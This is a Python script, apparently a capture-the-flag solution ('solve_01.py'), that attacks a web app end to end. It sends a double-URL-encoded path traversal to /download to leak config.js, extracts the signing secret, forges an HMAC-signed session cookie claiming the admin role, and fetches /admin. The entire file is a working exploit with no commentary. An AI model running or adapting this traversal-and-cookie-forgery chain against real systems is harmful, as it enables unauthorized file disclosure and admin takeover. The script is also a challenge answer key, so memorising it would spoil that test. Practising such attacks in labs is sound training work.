#!/usr/bin/env python3
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import sys
import urllib.request


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def fetch(url: str, cookie: str | None = None) -> str:
    req = urllib.request.Request(url)
    if cookie:
        req.add_header("Cookie", cookie)
    with urllib.request.urlopen(req, timeout=5) as res:
        return res.read().decode()


def main() -> None:
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve_01.py http://host:port")
    base = sys.argv[1].rstrip("/")

    fetch(base + "/")
    leaked = fetch(base + "/download?name=%252e%252e%252fconfig.js")
    secret = re.search(r'SIGNING_SECRET = "([^"]+)"', leaked).group(1)

    payload = b64url(json.dumps({"user": "guest", "role": "admin"}, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()
    answer = fetch(base + "/admin", f"session={payload}.{sig}")
    print(answer.strip())


if __name__ == "__main__":
    main()
